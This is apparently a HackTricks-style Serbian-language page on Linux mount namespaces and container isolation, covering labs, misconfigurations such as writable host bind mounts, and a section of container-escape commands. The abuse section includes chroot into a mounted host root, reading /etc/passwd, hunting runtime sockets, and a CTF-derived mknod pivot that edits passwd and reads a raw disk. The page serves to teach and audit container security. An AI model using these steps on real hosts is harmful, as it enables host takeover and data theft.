# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mount namespace kontroliše **mount table** koji proces vidi. Ovo je jedna od najvažnijih funkcija izolacije kontejnera zato što root filesystem, bind mounts, tmpfs mounts, prikaz procfs, izloženost sysfs i mnogi runtime-specifični pomoćni mountovi svi bivaju izraženi kroz tu mount table. Dva procesa mogu oba pristupati `/`, `/proc`, `/sys` ili `/tmp`, ali na šta ti putevi ukazuju zavisi od mount namespace-a u kojem se nalaze.

Iz perspektive container-security, mount namespace često pravi razliku između „ovo je uredno pripremljen application filesystem“ i „ovaj proces može direktno videti ili uticati na host filesystem“. Zato se bind mounts, `hostPath` volumes, privileged mount operations i writable `/proc` ili `/sys` izloženosti sve vrte oko ovog namespace-a.

## Funkcionisanje

Kada runtime pokrene kontejner, obično kreira nov mount namespace, pripremi root filesystem za kontejner, mount-uje procfs i druge pomoćne filesystem-e prema potrebi, a zatim opcionalno doda bind mounts, tmpfs mounts, secrets, config maps ili host paths. Kada taj proces radi unutar namespace-a, skup mount-ova koje vidi je u velikoj meri odvojen od podrazumevanog pogleda host-a. Host i dalje može videti stvarni podložni filesystem, ali kontejner vidi verziju koju je za njega sastavio runtime.

Ovo je moćno zato što dozvoljava kontejneru da veruje da ima sopstveni root filesystem iako host i dalje upravlja svime. Takođe je opasno zato što, ako runtime izloži pogrešan mount, proces iznenada dobija vidljivost u host resurse koje ostatak modela bezbednosti možda nije dizajniran da štiti.

## Lab

Možete kreirati privatni mount namespace sa:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ako otvorite drugi shell van tog namespace-a i pregledate mount table, videćete da tmpfs mount postoji samo unutar izolovanog mount namespace-a. Ovo je koristan primer jer pokazuje da mount izolacija nije apstraktna teorija; kernel bukvalno prikazuje drugačiju mount table procesu.
Ako otvorite drugi shell van tog namespace-a i pregledate mount table, tmpfs mount će postojati samo unutar izolovanog mount namespace-a.

Unutar kontejnera, brza uporedba je:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi primer pokazuje koliko je lako da runtime konfiguracija napravi veliku rupu u granici fajl-sistema.

## Korišćenje u runtime-u

Docker, Podman, containerd-based stacks, and CRI-O svi se oslanjaju na privatni mount namespace za obične kontejnere. Kubernetes gradi na istom mehanizmu za volumes, projected secrets, config maps i `hostPath` mount-ove. Incus/LXC okruženja takođe u velikoj meri zavise od mount namespaces, naročito zato što sistemski kontejneri često izlažu bogatije i više mašinski-slične fajl-sisteme nego aplikacioni kontejneri.

To znači da kada pregledate problem sa kontejnerskim fajl-sistemom, obično ne gledate izolovanu Docker čudnost. Gledate problem mount-namespace-a i runtime-konfiguracije izražen kroz platformu koja je pokrenula workload.

## Pogrešne konfiguracije

Najočiglednija i najopasnija greška je izlaganje host root filesystem-a ili nekog drugog osetljivog host puta putem bind mount-a, na primer `-v /:/host` ili `hostPath` koji omogućava upis u Kubernetesu. U tom trenutku, pitanje više nije "može li kontejner nekako da pobegne?" već "koliko korisnog host sadržaja je već direktno vidljivo i moguće za upisivanje?" Host bind mount koji omogućava upis često preostali deo exploita pretvara u jednostavno pitanje postavljanja fajlova, chrooting-a, izmene konfiguracije ili otkrivanja runtime soketa.

Još jedan čest problem je izlaganje host `/proc` ili `/sys` na načine koji zaobilaze sigurniji prikaz unutar kontejnera. Ovi fajl sistemi nisu obični data mount-ovi; oni su interfejsi prema kernelu i stanju procesa. Ako workload pristupi host verzijama direktno, mnoge pretpostavke na kojima počiva hardening kontejnera prestaju da važe čisto.

Zaštite samo za čitanje su takođe važne. Root filesystem koji je samo za čitanje ne obezbeđuje magično kontejner, ali uklanja veliki deo prostora za pripremu napadača i otežava perzistenciju, postavljanje pomoćnih binarnih fajlova i menjanje konfiguracije. Suprotno tome, root koji dopušta upis ili host bind mount koji je upisiv daje napadaču prostor da pripremi naredni korak.

## Zloupotreba

Kada se mount namespace zloupotrebi, napadači obično urade jednu od četiri stvari. Oni **čitaju podatke hosta** koji su trebali ostati van kontejnera. Oni **izmenjuju host konfiguraciju** preko bind mount-ova koji omogućavaju upis. Oni **montiraju ili ponovo montiraju dodatne resurse** ako capabilities i seccomp to dozvoljavaju. Ili **pristupe moćnim socket-ovima i direktorijumima runtime stanja** koji im omogućavaju da od same container platforme zatraže dodatni pristup.

Ako kontejner već može da vidi host filesystem, ostatak bezbednosnog modela se odmah menja.

Kada sumnjate na host bind mount, prvo potvrdite šta je dostupno i da li je moguće upisivati:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ako je root filesystem hosta montiran kao read-write, direktan pristup hostu je često jednostavan kao:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ako je cilj privileged runtime access umesto direktnog chrooting-a, nabrojite sockets i runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ako je prisutan `CAP_SYS_ADMIN`, testirajte i da li se iznutra kontejnera mogu kreirati novi mounts:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Kompletan primer: Two-Shell `mknod` Pivot

Postoji specijalizovaniji put zloupotrebe kada container root user može da kreira block devices, host i container dele user identity na koristan način, i attacker već ima low-privilege foothold na hostu. U toj situaciji, container može da kreira device node kao što je `/dev/sda`, a low-privilege host user kasnije može da ga pročita kroz `/proc/<pid>/root/` za odgovarajući matching container process.

Unutar containera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Sa hosta, kao odgovarajući low-privilege user nakon pronalaska container shell PID:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Važna lekcija nije tačna CTF pretraga stringova. Već to da mount-namespace izloženost kroz `/proc/<pid>/root/` može omogućiti korisniku hosta da ponovo iskoristi device nodes kreirane od strane container-a čak i kada cgroup device policy sprečava direktnu upotrebu unutar samog container-a.

## Provere

Ove komande služe da ti pokažu prikaz datotečnog sistema u kojem trenutni proces zapravo radi. Cilj je uočiti host-derived mounts, upisive osetljive putanje i sve što deluje šire od normalnog application container root filesystem-a.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Šta je ovde interesantno:

- Bind mounts from the host, especially `/`, `/proc`, `/sys`, runtime state directories, or socket locations, should stand out immediately.
- Neočekivani read-write mounts su obično važniji od velikog broja read-only helper mounts.
- `mountinfo` je često najbolje mesto da se vidi da li je putanja zaista izvedena sa hosta ili podržana overlay-om.

Ove provere utvrđuju **koji resursi su vidljivi u ovom namespace-u**, **koji potiču sa hosta**, i **koji od njih su pisivi ili bezbednosno osetljivi**.
{{#include ../../../../../banners/hacktricks-training.md}}
